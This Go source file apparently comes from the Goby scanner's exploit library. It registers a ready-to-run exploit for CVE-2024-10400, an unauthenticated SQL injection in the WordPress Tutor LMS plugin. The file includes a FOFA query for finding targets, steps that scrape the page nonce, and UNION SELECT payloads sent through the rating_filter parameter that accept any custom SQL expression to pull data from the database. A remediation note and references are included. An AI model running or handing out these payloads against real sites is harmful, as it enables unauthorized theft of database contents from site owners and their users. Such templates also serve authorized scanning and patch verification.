package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
)

func init() {
	expJson := `{
    "Name": "WordPress Tutor LMS plugin /wp-admin/admin-ajax.php SQL Injection Vulnerability (CVE-2024-10400)",
    "Description": "<p>The Tutor LMS plugin for WordPress is vulnerable to SQL Injection via the ‘rating_filter’ parameter in all versions up to, and including, 2.7.6 due to insufficient escaping on the user supplied parameter and lack of sufficient preparation on the existing SQL query. This makes it possible for unauthenticated attackers to append additional SQL queries into already existing queries that can be used to extract sensitive information from the database.</p>",
    "Product": "WordPress",
    "Homepage": "http://www.wordpress.com/",
    "DisclosureDate": "2024-11-21",
    "PostTime": "2024-12-30",
    "Author": "xzhdream@163.com",
    "FofaQuery": "body=\"/wp-content/plugins/tutor/\" && body=\"_tutor_nonce\"",
    "GobyQuery": "body=\"/wp-content/plugins/tutor/\" && body=\"_tutor_nonce\"",
    "Level": "2",
    "Impact": "<p>This makes it possible for unauthenticated attackers to append additional SQL queries into already existing queries that can be used to extract sensitive information from the database.</p>",
    "Recommendation": "<p>\tUpdate to version 2.7.7, or a newer patched version.</p><p><a href=\"https://plugins.trac.wordpress.org/changeset/3186319/tutor\">https://plugins.trac.wordpress.org/changeset/3186319/tutor</a></p>",
    "References": [
        "https://axsec.blog.csdn.net/article/details/144729311?spm=1001.2014.3001.5502"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "attackType",
            "type": "select",
            "value": "default,custom,sqlpoint",
            "show": ""
        },
        {
            "name": "default",
            "type": "select",
            "value": "database(),user()",
            "show": "attackType=default"
        },
        {
            "name": "custom",
            "type": "input",
            "value": "version()",
            "show": "attackType=custom"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "_tutor_nonce",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "nonce|lastbody|regex|_tutor_nonce\":\"([a-zA-Z0-9]+)\""
            ]
        },
        {
            "Request": {
                "method": "POST",
                "uri": "/wp-admin/admin-ajax.php",
                "follow_redirect": true,
                "header": {
                    "Content-Type": "application/x-www-form-urlencoded"
                },
                "data_type": "text",
                "data": "action=load_filtered_instructor&_tutor_nonce={{{nonce}}}&rating_filter=1e0+and+1=0+Union+select+1,2,3,4,5,6,7,8,9,CONCAT('==AAAA==',version(), '==AAAA=='),11,12,14--+-\r\n"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "regex",
                        "value": "==AAAA==.*?==AAAA==",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "vulurl|lastbody|variable|{{{fixedhostinfo}}}/wp-admin/admin-ajax.php"
            ]
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "_tutor_nonce",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "nonce|lastbody|regex|_tutor_nonce\":\"([a-zA-Z0-9]+)\""
            ]
        },
        {
            "Request": {
                "method": "POST",
                "uri": "/wp-admin/admin-ajax.php",
                "follow_redirect": true,
                "header": {
                    "Content-Type": "application/x-www-form-urlencoded"
                },
                "data_type": "text",
                "data": "action=load_filtered_instructor&_tutor_nonce={{{nonce}}}&rating_filter=1e0+and+1=0+Union+select+1,2,3,4,5,6,7,8,9,CONCAT('==AAAA==',{{{payload}}}, '==AAAA=='),11,12,14--+-\r\n"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "regex",
                        "value": "==AAAA==.*?==AAAA==",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "output|lastbody|regex|==AAAA==(.*?)==AAAA==",
                "output|when|attackType=sqlpoint|{{{lastreq}}}action=load_filtered_instructor&_tutor_nonce={{{nonce}}}&rating_filter=1e0+and+1=0+Union+select+1,2,3,4,5,6,7,8,9,concat(\"====\",user(),\"====\"),11,12,14--+-"
            ]
        }
    ],
    "Tags": [
        "SQL Injection"
    ],
    "VulType": [
        "SQL Injection"
    ],
    "CVEIDs": [
        "CVE-2024-10400"
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "7.5",
    "Translation": {
        "CN": {
            "Name": "WordPress Tutor LMS 插件 /wp-admin/admin-ajax.php SQL 注入漏洞 （CVE-2024-10400）",
            "Product": "wordpress",
            "Description": "<p>由于对用户提供的参数转义不足，以及对现有 SQL 查询准备不足，WordPress 的 Tutor LMS 插件在所有版本（包括 2.7.6 版）中都存在通过“rating_filter”参数进行 SQL 注入的漏洞。这使得未经身份验证的攻击者可以将其他 SQL 查询附加到现有查询中，这些查询可用于从数据库中提取敏感信息。<br></p>",
            "Recommendation": "<p>更新至版本 2.7.7 或更新的修补版本。<br></p><p><a href=\"https://plugins.trac.wordpress.org/changeset/3186319/tutor\">https://plugins.trac.wordpress.org/changeset/3186319/tutor</a>。<br></p>",
            "Impact": "<p>这使得未经身份验证的攻击者可以将其他 SQL 查询附加到现有查询中，这些查询可用于从数据库中提取敏感信息。<br></p>",
            "VulType": [
                "SQL注入"
            ],
            "Tags": [
                "SQL注入"
            ]
        },
        "EN": {
            "Name": "WordPress Tutor LMS plugin /wp-admin/admin-ajax.php SQL Injection Vulnerability (CVE-2024-10400)",
            "Product": "WordPress",
            "Description": "<p>The Tutor LMS plugin for WordPress is vulnerable to SQL Injection via the ‘rating_filter’ parameter in all versions up to, and including, 2.7.6 due to insufficient escaping on the user supplied parameter and lack of sufficient preparation on the existing SQL query. This makes it possible for unauthenticated attackers to append additional SQL queries into already existing queries that can be used to extract sensitive information from the database.<br></p>",
            "Recommendation": "<p>\tUpdate to version 2.7.7, or a newer patched version.<br></p><p><a href=\"https://plugins.trac.wordpress.org/changeset/3186319/tutor\">https://plugins.trac.wordpress.org/changeset/3186319/tutor</a><br></p>",
            "Impact": "<p>This makes it possible for unauthenticated attackers to append additional SQL queries into already existing queries that can be used to extract sensitive information from the database.<br></p>",
            "VulType": [
                "SQL Injection"
            ],
            "Tags": [
                "SQL Injection"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "Variables": {
        "payload": "switch|attackType|{{{default}}}"
    },
    "VariablesOrder": [
        "payload"
    ],
    "EditType": "fast",
    "PocId": "9981"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		nil,
		nil,
	))
}
